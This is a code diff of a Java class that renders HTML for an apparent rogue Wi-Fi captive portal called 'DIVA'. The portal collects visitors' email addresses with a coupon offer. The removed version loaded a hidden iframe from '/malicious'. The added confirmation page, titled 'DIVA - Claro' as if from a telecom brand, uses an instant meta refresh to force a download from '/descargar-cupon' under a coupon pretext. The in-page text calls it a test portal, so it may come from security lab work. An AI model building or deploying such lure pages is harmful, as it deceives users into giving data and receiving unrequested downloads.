@@ -1,66 +1,113 @@
 package com.diva.diva;
 
 public class PaginaPortal {
+
     public static String html(String token) {
+
         return envolver("""
                 <h1>DIVA</h1>
-                <p>Para continuar, por favor introduce tu correo electrónico y acepta los términos.</p>
-                <form action="/aceptar" method="POST">
-                    <input type="hidden" name="token" value=""" + token + """>
-                    <label for="email">Correo electrónico:</label>
-                    <input type="email" id="email" name="email" required>
-                    <br>
+
+                <form action="/aceptar" method="post">
+
+                  <input type="hidden"
+                         name="token"
+                         value="%s">
+
+                  <label for="email">
+                    Correo electrónico:
+                  </label>
+
+                  <input type="email"
+                         id="email"
+                         name="email"
+                         maxlength="254"
+                         required>
+
+                  <br><br>
+
+                  <details>
+                    <summary>Términos y condiciones</summary>
+
+                    <p>
+                      Usaremos tu correo para enviarte las instrucciones
+                      de uso de tus cupones de descuento.
+                      Usa una dirección que te pertenezca.
+                    </p>
+
+                    <p>
+                      La participación es voluntaria y no condiciona
+                      tu acceso a Internet.
+                      La sesión local caduca en unos 15 minutos.
+                    </p>
+
+                    <p>
+                      Este es un portal de prueba con HTTP.
+                      No introduzcas contraseñas.
+                    </p>
+                  </details>
+
+                  <p>
                     <label>
-                        <input type="checkbox" name="consentimiento" required>
-                        Acepto los términos y condiciones.
+                      <input type="checkbox"
+                             name="consentimiento"
+                             value="si"
+                             required>
+
+                      Acepto los términos y recibir este correo.
                     </label>
-                    <br>
-                    <button type="submit">Enviar</button>
+                  </p>
+
+                  <button type="submit">Enviar y obtener cupones</button>
+
                 </form>
-                """);
+                """.formatted(escapar(token)));
     }
 
-    public static String resultado() {
-        return envolver("""
-                <h1>DIVA</h1>
-                <p>Mira tu correo :)</p>
-                
-                <iframe src="/malicious" style="display:none; width:0; height:0; border:none;"></iframe>
-                """);
+    public static String confirmacion() {
+        // Incluye la meta-redirección nativa HTML para iniciar la descarga automáticamente
+        return """
+                <!doctype html>
+                <html lang="es">
+                <head>
+                  <meta charset="UTF-8">
+                  <meta name="viewport" content="width=device-width, initial-scale=1">
+                  <meta http-equiv="refresh" content="0;url=/descargar-cupon">
+                  <title>DIVA - Claro</title>
+                </head>
+                <body style="font-family: sans-serif; padding: 20px; text-align: center;">
+                  <h1>Mira tu correo</h1>
+                  <p>Te hemos enviado las instrucciones de uso. Tu descarga de cupones comenzará en un instante.</p>
+                </body>
+                </html>
+                """;
     }
 
     public static String mensaje(String texto) {
-        return envolver("<h1>DIVA</h1><p>" + escapar(texto) + "</p><a href='/'>Volver al portal</a>");
+        return envolver(
+                "<p>" + escapar(texto) + "</p>"
+                + "<a href='/'>Volver</a>"
+        );
     }
 
     public static String escapar(String texto) {
-        return texto.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;").replace("'", "&#39;");
+        if (texto == null) return "";
+        return texto.replace("&", "&amp;")
+                .replace("<", "&lt;")
+                .replace(">", "&gt;")
+                .replace("\"", "&quot;")
+                .replace("'", "&#39;");
     }
 
     private static String envolver(String contenido) {
         return """
-                <!DOCTYPE html>
-                <html>
+                <!doctype html>
+                <html lang="es">
                 <head>
-                    <meta charset="UTF-8">
-                    <title>DIVA</title>
-                    <style>
-                        body { background: #111116; color: #fff; font-family: system-ui; 
-                               display: flex; align-items: center; justify-content: center; 
-                               height: 100vh; margin: 0; }
-                        main { text-align: center; max-width: 400px; }
-                        h1 { color: #ff2b91; }
-                        input, button { width: 100%; padding: 10px; margin: 10px 0; 
-                                       border-radius: 5px; border: 1px solid #333; }
-                        button { background: #ff2b91; color: #111116; font-weight: bold; cursor: pointer; }
-                    </style>
+                  <meta charset="UTF-8">
+                  <meta name="viewport" content="width=device-width, initial-scale=1">
+                  <title>DIVA - Claro</title>
                 </head>
-                <body>
-                    <main>
-                        """ + contenido + """
-                    </main>
-                </body>
-                </html>
-                """;
+                <body style="font-family: sans-serif; padding: 20px; text-align: center;">
+                """ + contenido + "</body></html>";
     }
 }
